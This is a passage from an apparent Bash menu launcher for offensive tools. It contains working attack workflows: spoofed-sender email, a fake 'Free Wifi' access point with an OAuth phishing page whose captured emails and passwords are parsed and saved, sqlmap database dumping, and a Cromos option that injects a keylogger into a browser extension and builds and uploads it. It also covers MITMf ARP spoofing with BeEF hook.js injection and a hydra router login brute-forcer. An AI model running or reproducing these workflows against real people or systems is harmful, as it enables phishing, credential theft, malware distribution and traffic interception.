		echo -e "Credentials saved on /bin/lscript/smtp"
		sleep 3
	elif [[ "$SMTP" = "4" ]]
	then
		clear	
		echo -e "If you email fails, the reason is because on option 1 you didnt set the correct username and password. Find those at https://app.smtp2go.com/settings/users."
		sleep 2
		echo -e "$PAKTGB"
		read -e -n 1 -r
	elif [[ "$SMTP" = "3" ]]
	then
		if [[ -f /bin/lscript/smtp/smtpemail.txt ]]
		then
			rm /bin/lscript/smtp/smtpemail.txt
			echo -e "Username removed"
		else
			echo -e "Not username found"
		fi
		if [[ -f /bin/lscript/smtp/smtppass.txt ]]
		then
			rm /bin/lscript/smtp/smtppass.txt
			echo -e "Password removed"
		else
			echo -e "Not password found"
		fi
		sleep 2
		continue
	elif [[ "$SMTP" = "0" ]]
	then
		clear
		exit
	elif [[ "$SMTP" = "back" || "$SMTP" = "b" ]]
	then
		clear
		break
	elif [[ "$SMTP" = "2" ]]
	then
		while true
		do
		clear
		if [[ ! -f /bin/lscript/smtp/smtpemail.txt ]]
		then
			echo -e "No smtp username found."
			sm=1
		fi
		if [[ ! -f /bin/lscript/smtp/smtppass.txt ]]
		then
			echo -e "No smtp pass found."
			sm=1
		fi
		if [[ "$sm" = 1 ]]
		then
			break
		fi
		read smtppass < /bin/lscript/smtp/smtppass.txt
		read smtpemail < /bin/lscript/smtp/smtpemail.txt
		clear
		echo -e "Your username is "$RS""$smtpemail""$CE""
		echo -e ""
		echo -e "Enter the target's email: "
		read TARGETSEMAIL
		echo -e "Enter the email that you want the target to see: "
		read SPOOFEDEMAIL
		echo -e "Enter the subject of the message: "
		read SUBJECTEMAIL
		echo -e "Enter the message: "
		read MESSAGEEMAIL
		echo -e "Enter the smtp server ("$YS"Enter"$CE"=mail.smtp2go.com): "
		read SMTPSERVER
		if [[ "$SMTPSERVER" = "" ]]
		then
			SMTPSERVER="mail.smtp2go.com"
		fi
		echo -e "Enter the smtp port ("$YS"Enter"$CE"=2525): "
		read SMTPPORT
		if [[ "$SMTPPORT" = "" ]]
		then
			SMTPPORT="2525"
		fi
		echo -e "Press "$YS"enter"$CE" to send the message to "$TARGETSEMAIL""
		read 
		clear
		sendemail -f $SPOOFEDEMAIL -t $TARGETSEMAIL -u $SUBJECTEMAIL -m $MESSAGEEMAIL -s "$SMTPSERVER":"$SMTPPORT" -xu "$smtpemail" -xp "$smtppass"
		echo -e "$PAKTGB"
		read -e -n 1 -r
		break
		done
	fi
done
}
function new_terminal
{
	while true
	do
	clear
	if [[ "$ALFA" = "yes" ]]
	then
		CHECKMON=$(iwconfig "$WLANN" | grep "Mode:Monitor")
	else
		CHECKMON=$(ifconfig | grep "$WLANNM")
	fi
	clear
	if [[ "$CHECKMON" = "" ]]
	then
		echo -e "Monitor mode is not enabled."
		echo -e ""
		echo -e "Do you want to enable monitor mode? "$YNYES": "
		read MONITOREN
		clear
		if [[ "$MONITOREN" = "n" ]]
		then
		#~ echo -e "Select 'start' or '2' to enable it"
			echo -e "$PAKTGB"
			$READAK
			clear
			exec bash "$0"
		else
			CHECKWL=$(ifconfig | grep "$WLANN")
			if [[ "$CHECKWL" == "" ]]
			then
				echo -e ""$RS""$WLANN" was not found"$CE""
				sleep 2
				BACKL=1
				break
			fi
			start_menu
			continue
		fi
	else
		if [[ "$YORNAA" = "10" ]]
		then
			echo -e "Moving into new terminal..."
			sleep 1
			FJC=0
			export FJC
			gnome-terminal --geometry 87x35+9999+0 -- lh1
			sleep 1
			exec bash "$0"
			break
		elif [[ "$YORNAA" = "11" ]]
		then
			clear
			echo -e "Moving into new terminal..."
			sleep 1
			gnome-terminal --geometry 80x25+9999+0 -- lh3
			sleep 1
			exec bash "$0"
			break
		elif [[ "$YORNAA" = "12" ]]
		then
			echo -e "Moving into new terminal..."
			sleep 1
			gnome-terminal --geometry 80x25+9999+0 -- lh4
			sleep 1
			exec bash "$0"
			break
		fi
	fi
	done
}
function check_if_ks
{
	while [ $var1 -le $HOWMANY ]
	do
		if [[ -f "$KSPATH"/nums/"$var1".txt ]]
		then
			read TITLE < "$KSPATH"/nums/"$var1".txt
			read YORNAKS < "$KSPATH"/"$TITLE"/"$TITLE"ks.txt
			if [[ "$YORNAA" = "$YORNAKS" ]]
			then
				read COMMAND1 < ""$KSPATH"/"$TITLE"/"$TITLE".txt"
				read COMMAND2 < ""$KSPATH"/"$TITLE"/"$TITLE"2.txt"
				$COMMAND1
				#~ if [[ -f ""$KSPATH"/"$TITLE"/"$TITLE"3.txt" ]]
				#~ then
					#~ read $COMMAND3 < ""$KSPATH"/"$TITLE"/"$TITLE"3.txt"
					#~ $COMMAND3
				#~ fi
				$COMMAND2
				BACKL="1"
			fi
		fi
		var1=$(( var1+1 ))
	done
}
function wififb_attack
{
	
	while true
	do
		clear
		TERMINALTITLE="WIFIFB-MENU"
		dash_calc
		printf '\033]2;WIFIFB-MENU\a'	
		echo -e ""$YS" 1"$CE") Start attack ("$BS"always end the attack with ESC"$CE")"
		echo -e ""$YS" 2"$CE") Check & save new passwords ("$BS"do it at the end of the attack"$CE")"
		echo -e ""$YS" 3"$CE") Show all-saved-passwords"
		echo -e ""$YS" 4"$CE") Copy all-saved-passwords file to desktop"
		echo -e ""$YS" 5"$CE") Delete the all-saved-passwords file"
		echo -e ""$YS" 6"$CE") Fix no wifi issue after the attack"
		echo -e ""$YS" b"$CE") Go back"
		echo -e "Choose:"
		read wifimenu
		clear
		if [[ "$wifimenu" == 1 ]]
		then
			wififb
		elif [[ "$wifimenu" == 2 ]]
		then
			wififb_pass
			echo -e "$PAKTGB"
			$READAK
		elif [[ "$wifimenu" == 3 ]]
		then
			if [[ -f $wififbpassfileall ]]
			then
				cat $wififbpassfileall
			else
				echo -e ""$RS"File not found. Get some paswords first."$CE""
			fi
			echo -e "$PAKTGB"
			$READAK
		elif [[ "$wifimenu" == 4 ]]
		then
			cp $wififbpassfileall /root/Desktop/all-saved-passwords.txt && echo -e "Done"
		elif [[ "$wifimenu" == 5 ]]
		then
			rm $wififbpassfileall && echo -e "Done"
		elif [[ "$wifimenu" == 6 ]]
		then
			nmcli n on
			echo -e "Error fixed, you may need to restart your system"
			echo -e "$PAKTGB"
			$READAK
		elif [[ "$wifimenu" == 'b' || "$wifimenu" == "back" || "$wifimenu" == 00 ]]
		then
			exec bash $0
		fi
	done
}
function wififb
{
	echo -e "Access point's name: "
	echo -e " "$YS"1"$CE") Free Wifi"
	echo -e " "$YS"2"$CE") FREE WIFI"
	echo -e " "$YS"3"$CE") Wifi Hotspot"
	echo -e " "$YS"4"$CE") WIFI HOTSPOT"
	echo -e " "$YS"5"$CE") Hotspot"
	echo -e " "$YS"6"$CE") Android Hotspot"
	echo -e " "$YS"7"$CE") Cafe Wifi"
	echo -e " "$YS"8"$CE") Public Wifi"
	echo -e " "$YS"9"$CE") PUBLIC WIFI"
	echo -e ""$YS"10"$CE") Free Public Wifi"
	echo -e ""$YS"11"$CE") FREE PUBLIC WIFI"
	echo -e " "$YS"c"$CE") Custom name"
	echo -e " "$YS"b"$CE") Go back"
	read wifiind
	if [[ "$wifiind" == 1 ]]
	then
		wifiname="Free Wifi"
	elif [[ "$wifiind" == 2 ]]
	then
		wifiname="FREE WIFI"
	
	elif [[ "$wifiind" == 3 ]]
	then
		wifiname="Wifi Hotspot"
	
	elif [[ "$wifiind" == 4 ]]
	then
		wifiname="WIFI HOTSPOT"
	
	elif [[ "$wifiind" == 5 ]]
	then
		wifiname="Hotspot"
	
	elif [[ "$wifiind" == 6 ]]
	then
		wifiname="Android Hotspot"
	
	elif [[ "$wifiind" == 7 ]]
	then
		wifiname="Cafe Wifi"
	
	elif [[ "$wifiind" == 8 ]]
	then
		wifiname="Public Wifi"
	
	elif [[ "$wifiind" == 9 ]]
	then
		wifiname="PUBLIC WIFI"
	
	elif [[ "$wifiind" == 10 ]]
	then
		wifiname="Free Public Wifi"
	
	elif [[ "$wifiind" == 11 ]]
	then
		wifiname="FREE PUBLIC WIFI"
	
	elif [[ "$wifiind" == 'c' ]]
	then
		clear
		echo -e "Custom access point name:"
		read wifiname
	elif [[ "$wifiind" == 'b' || "$wifiind" == 'back' ]]
	then
		wififb_attack
	fi
	ESSIDAP=$wifiname
	export ESSIDAP
	export wififbfile
	xterm -hold -geometry 160x60+9999+999999 -e bash -c 'printf "\033]2;WIFI FB TRAP\a" && wifiphisher --noextensions --essid "$ESSIDAP" -p oauth-login -kB --logging | tee $wififbfile; exec bash' & disown 
}
function wififb_pass
{
	if [[ -f $wififbfile ]]
	then
		##findhowmanylines
		lines=$(cat $wififbfile | awk 'END{print NR}')
		n=1
		z=0
		while [[ "$n" -le "$lines" ]]
		do
			USERNAME=""
			PASS=""
			USERNAME=$(cat $wififbfile | awk  -v nn="$n" '{if(NR==nn && /wfphshr-email=/)print}' | awk -F "email=" {'print $2'} | cut -d '&' -f1)
			if [[ ! "$USERNAME" == "" ]]
			then
				z=$((z+1))
				PASS=$(cat $wififbfile | awk  -v nn="$n" '{if(NR==nn && /word=/)print}' | awk -F "word=" {'print $2'} | cut -d '' -f1)
				if [[ "$PASS" == "" ]]
				then
					PASS="No password found"
				fi
				echo -e ""$USERNAME":"$PASS"" >> $wififbpassfile
			fi
			USERNAME=""
			PASS=""
			n=$((n+1))
		done
		if [[ "$z" == 0 ]]
		then
			echo -e "No usernames or passwords found" >> $wififbpassfile
		fi
		echo -e "----------------------------------------------------------------" >> $wififbpassfile
		cat $wififbpassfile
		if [[ ! "$z" == 0 ]]
		then
			cat $wififbpassfile >> $wififbpassfileall
			cat $wififbfile >> $wififbfileall
			echo -e "New usernames/passwords moved to all-saved-passwords file"
		fi
		echo -e "" > $wififbpassfile
		echo -e "" > $wififbfile
	else
		echo -e ""$RS"$wififbfile not found."$CE""
		sleep 3
	fi
}
function sqlmap_menu
{
file2="/root/lscript/sqltemp2"
file3="/root/lscript/sqltemp3"
file4="/root/lscript/sqltemp34"
while true
do
	clear
	TERMINALTITLE="SQLMAP"
	dash_calc
	printf '\033]2;SQLMAP\a'
	if [[ "$URL" = "" ]]
	then
		URL=""$RS"None"$CE""
		urls=0
	fi
	if [[ "$FDBS" = "" ]]
	then
		FDBS=""$RS"None"$CE""
		fdbss=0
	fi
	if [[ "$SD" = "" ]]
	then
		SD=""$RS"None"$CE""
		sds=0
	fi
	if [[ "$TB" = "" ]]
	then
		TB=""$RS"None"$CE""
		tbs=0
	fi
	if [[ "$ST" = "" ]]
	then
		ST=""$RS"None"$CE""
		sts=0
	fi
	if [[ "$CL" = "" ]]
	then
		CL=""$RS"None"$CE""
		cls=0
	fi
	if [[ "$SC" = "" ]]
	then
		SC=""$RS"None"$CE""
		scs=0
	fi
	echo -e ""$YS" 1"$CE") URL                         Current:"$YS"$URL"$CE""
	if [[ "$urls" = 0 ]]
	then
		echo -e ""$RS" 2"$CE") Fetch databases             Current:$FDBS"
	else
		echo -e ""$YS" 2"$CE") Fetch databases             Current:$FDBS"
	fi
	if [[ "$fdbss" = 0 ]]
	then
		echo -e ""$RS" 3"$CE") Select database             Current:"$YS"$SD"$CE""
	else
		echo -e ""$YS" 3"$CE") Select database             Current:"$YS"$SD"$CE""
	fi
	if [[ "$sds" = 0 ]]
	then
		echo -e ""$RS" 4"$CE") Fetch tables                Current:"$YS"$TB"$CE""
	else
		echo -e ""$YS" 4"$CE") Fetch tables                Current:"$YS"$TB"$CE""
	fi
	if [[ "$tbs" = 0 ]]
	then
		echo -e ""$RS" 5"$CE") Select table                Current:"$YS"$ST"$CE""
	else
		echo -e ""$YS" 5"$CE") Select table                Current:"$YS"$ST"$CE""
	fi
	if [[ "$sts" = 0 ]]
	then
		echo -e ""$RS" 6"$CE") Fetch columns               Current:"$YS"$CL"$CE""
	else
		echo -e ""$YS" 6"$CE") Fetch columns               Current:"$YS"$CL"$CE""
	fi
	if [[ "$cls" = 0 ]]
	then
		echo -e ""$RS" 7"$CE") Select columns              Current:"$YS"$SC"$CE""
	else
		echo -e ""$YS" 7"$CE") Select columns              Current:"$YS"$SC"$CE""
	fi
	if [[ "$scs" = 0 ]]
	then
		echo -e ""$RS" s"$CE") Start"
	else
		echo -e ""$YS" s"$CE") Start"
	fi
	echo -e ""$YS" b"$CE") Go back"
	echo -e "Choose: "
	read SQ
	clear
	if [[ "$SQ" = 1 ]]
	then
		echo -n "URL: "
		read URLL
		if [[ "$URLL" != "" || "$URLL" = "b" ]]
		then
			URL="$URLL"
			urls=1
				##Clearing nexts
				FDBS=""
				fdbss=0
				SD=""
				sds=0
				TB=""
				tbs=0
				ST=""
				sts=0
				cls=0
				CL=""
				scs=0
				SC=""
		fi
	elif [[ "$SQ" = "s" ]]
	then
		if [[ "$scs" = 0 ]]
		then
			echo -e ""$RS"No columns selected"$CE""
			sleep 2
			break
		fi
		#~ export URL
		#~ export SD
		#~ export ST
		#~ export SC
		sqlmap -u "$URL" -D "$SD" -T "$ST" -C "$SC" --dump | tee "$file4"
		echo -e ""
		echo -e ""$YS"A log file has been created on "$file4". Copy it before it gets overwritten"$CE""
		echo -e ""
		echo -e "$PAKTGB"
		$READAK
	elif [[ "$SQ" = "b" ]]
	then
		break
	elif [[ "$SQ" = 00 ]]
	then
		exec bash $0
	elif [[ "$SQ" = 7 ]]
	then
		if [[ "$cls" = 0 ]]
		then
			echo -e ""$RS"Columns not fetched"$CE""
			sleep 2
			break
		fi
		n10=1
		CCO1="$CO1"
		while [[ "$n10" -le "$NCO" ]]
		do
			cl[$n10]=$(cat "$file3" | awk -v n12="$CCO1" '{if(NR==n12)print}' | cut -d ' ' -f2)
			CCO1=$((CCO1+1))
			n10=$((n10+1))
		done
		while true
		do
			clear
			echo -e ""$BS"Columns: "$CE""
			v=1
			while [[ "$v" -le "$NCO" ]]
			do
				if [[ "${selc[$v]}" = 1 ]]
				then
					SSC="$YS"
				else
					SSC="$WS"
				fi
				if [[ "$v" -le 9 ]]
				then
					echo -e ""$YS"  $v"$CE") "$SSC"${cl[$v]}"$CE""
				elif [[ "$v" -le 99 ]]
				then
					echo -e ""$YS" $v"$CE") "$SSC"${cl[$v]}"$CE""
				else
					echo -e ""$YS"$v"$CE") "$SSC"${cl[$v]}"$CE""
				fi
				v=$((v+1))
			done
			echo -e ""$YS" d"$CE") Deselect all"
			echo -e ""$YS" s"$CE") Save selection"
			echo -e ""$YS" b"$CE") Go back"
			echo -e "Choose: "
			read COCH
			clear
			if [[ "$COCH" = "b" || "$COCH" = "back" ]]
			then
				break
			elif [[ "$COCH" = "s" ]] 
			then
				v2=1
				SC=""
				while [[ "$v2" -le "$NCO" ]]
				do
					if [[ "${selc[$v2]}" = 1 ]]
					then
						if [[ "$SC" = "" ]]
						then
							SC="${cl[$v2]}"
						else
							SC=""$SC","${cl[$v2]}""
						fi
					fi
					v2=$((v2+1))
				done
				if [[ "$SC" = "" ]]
				then
					echo -e ""$RS"Nothing selected"$CE""
					ssc=0
					sleep 2
				else
					ssc=1
				fi
				break
			elif [[ "$COCH" = "d" ]] 
			then
				v1=1
				while [[ "$v1" -le "$NCO" ]]
				do
					selc[$v1]=""
					v1=$((v1+1))
				done
			elif [[ "$COCH" -le 0 || "$COCH" -gt "$NCO" ]] 
			then
				echo -e ""$RS"Wrong choice"$CE""
				sleep 2
				continue
			else
				if [[ "${selc[$COCH]}" != 1 ]]
				then
					selc[$COCH]=1
				else
					selc[$COCH]=""
				fi
			fi
		done
	elif [[ "$SQ" = 6 ]]
	then
		while true
		do
			if [[ "$sts" = 0 ]]
			then
				echo -e ""$RS"Table not selected"$CE""
				sleep 2
				break
			fi
			sqlmap -u "$URL" -D "$SD" -T "$ST" --columns <<< $'\n\n\n\n\n\n\n\n\n\n' | tee $file3
			##finding columns
			CO=$(cat "$file3" | awk '{if(/+----/)print NR}')
			CO1=$(echo $CO | cut -d ' ' -f2)
			CO1=$((CO1+1))
			CO2=$(echo $CO | cut -d ' ' -f3)
			CO2=$((CO2-1))
			NCO=$((CO2-CO1))
			if [[ "$NCO" -le 0 ]]
			then
				echo -e ""$RS"Error 24. No columns found automatically"$CE""
				sleep 2
				cls=0
				continue
			else
				if [[ "$NCO" = 1 ]]
				then
					echo -e ""$YS"1 column found!"$CE""
					sleep 2
				else
					echo -e ""$YS""$NCO" columns found!"$CE""
					sleep 2
				fi
				CL="Done"
				cls=1
				break
			fi
		done
	elif [[ "$SQ" = 5 ]]
	then
		while true
		do
			if [[ "$tbs" = 0 ]]
			then
				echo -e ""$RS"Tables not fetched"$CE""
				sleep 2
				break
			fi
			echo -e ""$BS"Tables: "$CE""
			n9=1
			CC1="$C1"
			while [[ "$n9" -le "$NTB" ]]
			do
				tb[$n9]=$(cat "$file2" | awk -v n11="$CC1" '{if(NR==n11)print}' | cut -d ' ' -f2)
				if [[ "$n9" -le 9 ]]
				then
					echo -e ""$YS"  $n9"$CE") ${tb[$n9]}"
				elif [[ "$n9" -le 99 ]]
				then
					echo -e ""$YS" $n9"$CE") ${tb[$n9]}"
				else
					echo -e ""$YS"$n9"$CE") ${tb[$n9]}"
				fi
				CC1=$((CC1+1))
				n9=$((n9+1))
			done
			echo -e ""$YS" b"$CE") Go back"
			echo -e "Choose: "
			read TCH
			if [[ "$TCH" = "b" || "$TCH" = "back" ]]
			then
				break
			elif [[ "$TCH" -le 0 || "$TCH" -gt "$NTB" ]] 
			then
				echo -e ""$RS"Wrong choice"$CE""
				sleep 2
				continue
			else
				ST="${tb[$TCH]}"
				sts=1
				##Clearing nexts
				cls=0
				CL=""
				scs=0
				SC=""
				break
			fi
		done
	elif [[ "$SQ" = 4 ]]
	then
		if [[ "$sds" = 0 ]]
		then
			echo -e ""$RS"Databases not selected"$CE""
			sleep 2
			continue
		fi
		sqlmap -u "$URL" -D "$SD" --tables <<< $'\n\n\n\n\n\n\n\n\n\n' | tee "$file2"
		##finding tables
		C=$(cat "$file2" | awk '{if(/+----/)print NR}')
		C1=$(echo $C | cut -d ' ' -f1)
		C1=$((C1+1))
		C2=$(echo $C | cut -d ' ' -f2)
		C2=$((C2-1))
		NTB=$((C2-C1))
		if [[ "$NTB" -le 0 ]]
		then
			echo -e ""$RS"Error 23. No tables found automatically"$CE""
			sleep 2
			tbs=0
			continue
		else
			if [[ "$NTB" = 1 ]]
			then
				echo -e ""$YS"1 table found!"$CE""
				sleep 2
			else
				echo -e ""$YS""$NTB" tables found!"$CE""
				sleep 2
			fi
			TB="Done"
			tbs=1
				##Clearing nexts
				ST=""
				sts=0
				cls=0
				CL=""
				scs=0
				SC=""
		fi
	elif [[ "$SQ" = 3 ]]
	then
		while true
		do
			if [[ "$fdbss" = 0 ]]
			then
				echo -e ""$RS"Databases not fetched"$CE""
				sleep 2
				continue
			fi
			echo -e ""$BS"Databases: "$CE""
			n8=1
			while [[ "$n8" -le "$NDB" ]]
			do
				if [[ "$n8" -le 9 ]]
				then
					echo -e ""$YS"  "$n8""$CE") ${db[$n8]}"
				elif [[ "$n8" -le 99 ]]
				then
					echo -e ""$YS" "$n8""$CE") ${db[$n8]}"
				else
					echo -e ""$YS""$n8""$CE") ${db[$n8]}"
				fi
				n8=$((n8+1))
			done
			echo -e ""$YS" b"$CE") Go back"
			echo -e "Choose: "
			read DCH
			clear
			if [[ "$DCH" = "b" || "$DCH" = "back" ]]
			then
				break
			fi
			if [[ "$DCH" -lt 0 || "$DCH" -gt "$NDB" ]]
			then
				echo -e ""$RS"Wrong choice"$CE""
				sleep 2
			else
				SD="${db[$DCH]}"
				sds=1
					##Clearing nexts
					TB=""
					tbs=0
					ST=""
					sts=0
					cls=0
					CL=""
					scs=0
					SC=""
				break
			fi	
		done
	elif [[ "$SQ" = 2 ]]
	then
		if [[ "$urls" != 1 ]]
		then
			echo -e ""$RS"URL not selected"$CE""
			sleep 2
			continue
		fi
		file="/root/lscript/sqltemp"
		sqlmap -u "$URL" --dbs <<< $'\n\n\n\n\n\n\n\n\n\n' | tee "$file"
		##Find the line
		CHECK=$(cat "$file" | grep "available databases ")
		if [[ "$CHECK" = "" ]]
		then
			fdbss=0
			echo -e ""$RS"No databases found or not vulnerable website"$CE""
			fdbss=0
			echo -e "$PAKTGB"
			$READAK
			continue
		fi
		LINED=$(cat "$file" | awk '{if(/available databases /)print NR}')
		LINED=$((LINED+1))
		##list databases
		n=0
		echo -e ""BS"Calculating..."$CE""
		while true
		do
			CH=$(cat "$file" | awk -v n7="$LINED" '{if(NR==n7)print}')
			if [[ "$CH" = "" ]]
			then
				break
			else
				##how many dbs found
				n=$((n+1))
				##next line
				LINED=$((LINED+1))
			fi
			CHH=$(echo "$CH" | awk -F "] " {'print $2'})
			if [[ "$CHH" = "" ]]
			then
				echo -e ""$RS"Error 21"$CE""
				CHH=""$RS"Error"$CE""
				sleep 3
			fi
			db[$n]="$CHH"
		done
		sleep 1
		if [[ "$n" = 0 ]]
		then
			echo -e ""$RS"Error 22 No databases found automatically"$CE""
			echo -e "$PAKTGB"
			$READAK
			continue
		elif [[ "$n" = 1 ]]
		then
			echo -e ""$YS"1 database found!"$CE""
			sleep 1
		else
			echo -e ""$YS"$n databases found!"$CE""
			sleep 1
		fi
		echo -e ""
		FDBS=""$YS"Done"$CE""
		fdbss=1
		NDB="$n"
				##Clearing nexts
				SD=""
				sds=0
				TB=""
				tbs=0
				ST=""
				sts=0
				cls=0
				CL=""
				scs=0
				SC=""
	fi	
done
}
function cromos_menu
{
	if [[ ! -d /root/cromos ]]
	then
		echo -e ""$RS"Cromos directory was not found on /root"$CE""
		echo -e ""$RS"Fix this issue by installing it within lscript"$CE""
		echo -e "$PAKTGB"
		$READAK
	else
		cd /root/cromos
		while true
		do
			clear
			TERMINALTITLE="CROMOS MENU"
			dash_calc
			printf '\033]2;CROMOS MENU\a'
			if [[ "$CEX" == "" ]]
			then
				CEX="None"
			fi
			if [[ "$CMOD" == "" ]]
			then
				CMOD="keylogger"
			fi
			echo -e " Current extension: "$RS"$CEX"$CE""
			echo -e " "$YS"1"$CE") Download/select an extension"
			echo -e " "$YS"2"$CE") Choose module                     "$YS"$CMOD"$CE""
			echo -e " "$YS"3"$CE") Infect"
			echo -e " "$YS"4"$CE") Build"
			echo -e " "$YS"5"$CE") Upload to dropbox"
			echo -e " "$YS"b"$CE") Go back"
			echo -e " "$YS"0"$CE") Exit"
			echo -e "Choose: "
			read CROM
			clear
			if [[ "$CROM" == 1 ]]
			then
				echo -e "Extension ID: "
				read EXID
				python cromos.py --extension "$EXID" && CEX=""$YS"$EXID"$CE""
				sleep 2
			elif [[ "$CROM" == 2 ]]
			then
				if [[ "$CMOD" == "keylogger" ]]
				then
					CMOD="currency"
				else
					CMOD="keylogger"
				fi
			elif [[ "$CROM" == 3 ]]
			then
				python cromos.py --extension "$EXID" --load "$CMOD"
				sleep 2
			elif [[ "$CROM" == 4 ]]
			then
				echo -e "File type to build to("$YS"Enter"$CE"="$YS"bat"$CE"):"
				read buildext
				if [[ "$buildext" == "" ]]
				then
					buildext="bat"
				fi
				python cromos.py --extension "$EXID" --build "$buildext" && xdg-open /root/cromos/output/builds
				echo -e "$PAKTGB"
				$READAK
			elif [[ "$CROM" == 5 ]]
			then
				echo -e "Token: "
				read CTOK
				python cromos.py --extension "$EXID" --token "$CTOK"
				echo -e "$PAKTGB"
				$READAK
			elif [[ "$CROM" == "b" || "$CROM" == "back" ]]
			then
				break
			elif [[ "$CROM" == 0 ]]
			then
				exit
			elif [[ "$CROM" == 00 ]]
			then
				exec bach $0
			fi
		done
	fi
}
function mitmf_hook
{
	TERMINALTITLE="MITMF + BEEF"
	dash_calc
	printf '\033]2;MITMF + BEEF\a'
	if [[ -d /root/MITMf ]]
	then
		TEST=$(ifconfig | grep "$ETH")
		n=1
		echo -e ""$BS"Available interfaces"$CE": "
		if [[ "$TEST" != "" ]]
		then
			echo -e ""$YS"$n"$CE") "$ETH""
			in[$n]="$ETH"
			n=$((n+1))
		fi
		TEST=$(ifconfig | grep "$WLANN")
		if [[ "$TEST" != "" ]]
		then
			echo -e ""$YS"$n"$CE") $WLANN"
			in[$n]="$WLANN"
			n=$((n+1))
		fi
		TEST=$(ifconfig | grep "$WLANNM")
		if [[ "$TEST" != "" ]]
		then
			echo -e ""$YS"$n"$CE") $WLANNM"
			in[$n]="$WLANNM"
			n=$((n+1))
		fi
		echo -e "Choose: "
		read ints
		if [[ "$ints" -le "$n" && "$ints" -ge 1 ]]
		then
			#~ echo -e "You selected "$YS"${in[$ints]}"$CE"" #debugging
			mitmfint="${in[$ints]}"
			export mitmfint
			clear
			mitmfgate=$(route -n | grep "$mitmfint" | awk '{if($2!="0.0.0.0"){print $2}}')
			export mitmfgate
			clear
			echo -e "Target's IP: "
			read mitmftar
			TEST=$(ifconfig | grep $mitmfint)
			if [[ $TEST != "" ]]
			then
				iffile=""$LPATH"/iftemp.txt"
				ifconfig $mitmfint > $iffile
				mitmflocalip=$(cat $iffile | grep " inet " | awk -F "inet " {'print $2'} | cut -d ' ' -f1)
			fi
			clear
			echo -e "hook.js URL path("$YS"Enter"$CE"=http://"$mitmflocalip":3000/hook.js): "
			read hookch
			if [[ "$hookch" = "" ]]
			then
				mitmfhook="http://"$mitmflocalip":3000/hook.js"
			else
				mitmfhook="$hookch"
			fi
			export mitmfhook
			cd /root/MITMf
			clear
			python mitmf.py -i "$mitmfint" --spoof --arp --gateway "$mitmfgate" --target "$mitmftar" --hsts --inject --js-url "$mitmfhook"
			cd
		fi
	else
		echo -e ""$RS"Mitmf is not installed.type '"$CE""$YS"install"$CE""$RS"' to install it."
		read INSTALL
		if [[ "$INSTALL" = "install" ]]
		then
			echo -e ""$RS"No installation added yet"$CE""
			sleep 2
		fi
	fi
	cd
}
function bruteforce_router
{
while true
do
	clear
	TERMINALTITLE="BRUTEFORCE LOGIN"
	dash_calc
	TERMINALTITLE="ONLY FOR LEGAL PURPOSES"
	dash_calc
	printf '\033]2;BRUTEFORCE LOGIN\a'
	if [[ "$BI" = "" ]]
	then
		TT=$(ifconfig | grep "$WLANN")
		if [[ "$TT" = "" ]]
		then
			bin=0
			BI=""$RS"None"$CE""
		else
			bin=1
			BI="$WLANN"
		fi
	fi
	if [[ "$US" = "" ]]
	then
		US="admin"
	fi
	if [[ "$WL" = "" ]]
	then
		wls=0
		WL=""$RS"None"$CE""
	fi
	if [[ "$RQ" = "" ]]
	then
		rqq=0
		RQ=""$RS"None"$CE""
	fi
	if [[ "$UP" = "" ]]
	then
		upp=0
		UP=""$RS"None"$CE""
	fi
	if [[ "$IS" = "" ]]
	then
		iss=0
		IS=""$RS"None"$CE""
	fi
	if [[ "$FM" = "" ]]
	then
		FM="http-post-form"
	fi
	#~ echo -e ""$RS"ONLY FOR LEGAL PURPOSES"$CE""
	echo -e ""$YS" 1"$CE") Select interface           Current:"$YS""$BI""$CE""
	echo -e ""$YS" 2"$CE") Set username               Current:"$YS""$US""$CE""
	echo -e ""$YS" 3"$CE") Select wordlist            Current:"$YS""$WL""$CE""
	echo -e ""$YS" 4"$CE") Request URI:               Current:"$YS""$RQ""$CE""
	echo -e ""$YS" 5"$CE") ^USER^ & ^PASS^ field      Current:"$YS""$UP""$CE""
	echo -e ""$YS" 6"$CE") Invalid pass string        Current:"$YS""$IS""$CE""
	echo -e ""$YS" 7"$CE") Form                       Current:"$YS""$FM""$CE""
	echo -e ""$YS" 8"$CE") Open router's login page in browser"
	echo -e ""$YS" w"$CE") Open Wireshark"
	echo -e ""$YS" s"$CE") Start bruteforcing"
	echo -e ""$YS"bu"$CE") Burpsuite automated tool"
	echo -e ""$YS" i"$CE") Info"
	echo -e ""$YS" b"$CE") Go back"
	echo -n "Choose: "
	read BR
	clear
	if [[ "$BR" = "b" || "$BR" = 00 || "$BR" = "back" ]]
	then
		BACKL=1
		break
	elif [[ "$BR" = "bu" ]]
	then
		burpsuite
	elif [[ "$BR" = "w" ]]
	then
		wireshark & disown
	elif [[ "$BR" = 0 ]]
	then
		exit
	elif [[ "$BR" = "i" ]]
	then
		echo -e ""$LGYS"With hydra you can bruteforce your router's login screen."
		echo -e "Select interface"
		echo -e "	You need to select an interface so the script can get the gateway."
		echo -e "Set username"
		echo -e "	Set the username for the login screen.(e.g. admin)"
		echo -e "Select wordlist"
		echo -e "	Select a text file with a password on every line."
		echo -e "Request URI"
		echo -e "	You will find this on Wireshark. Follow the video below for instructions."
		echo -e "	(e.g. /login.php) or (e.g. /cgi-bin/login.exe) etc etc..."
		echo -e "^USER^ & ^PASS^ field"
		echo -e "	You will find this on Wireshark. Follow the video below for instructions."
		echo -e "	(e.g. username=^USER^&password=^PASS^)"
		echo -e "Invalid pass string"
		echo -e "	You will find this when you try to login with the wrong pass on the login page."
		echo -e "	You need to set a word that is being printed on the screen when login fails."
		echo -e "	(e.g. Invalid) or (e.g. Wrong) or (e.g. Please) etc etc..."
		echo -e "	Follow the video below for instructions."
		echo -e "Form"
		echo -e "	(e.g. http-get-form) or (e.g. http-post-form) etc etc..."
		echo -e ""
		echo -e "Video-demonstration: https://www.youtube.com/watch?v=vgbP0AQ5bt4"
		echo -e ""
		echo -e ""$CE""
		echo -e "$PAKTGB"
		$READAK
	elif [[ "$BR" = 1 ]]
	then
		select_interface
		if [[ "$OUTPUT" != "" && "$OUTPUT" != 0 ]]
		then
			bin=1
			BI="$OUTPUT"
		else
			bin=0
		fi
	elif [[ "$BR" = 2 ]]
	then
		echo -n "Username: "
		read US
	elif [[ "$BR" = 3 ]]
	then
		echo -n "Wordlist: "
		read WL
		if [[ ! -f "$WL" ]]
		then
			WL=""
			echo -e ""$RS"Couldn't find the wordlist"$CE""
			wls=0
			sleep 2
		else
			wls=1
		fi
	elif [[ "$BR" = 4 ]]
	then
		echo -n "Request URI: "
		read RQ
		rqq=1
	elif [[ "$BR" = 5 ]]
	then
		echo -n "^USER^ & ^PASS^ field: "
		read UP
		upp=1
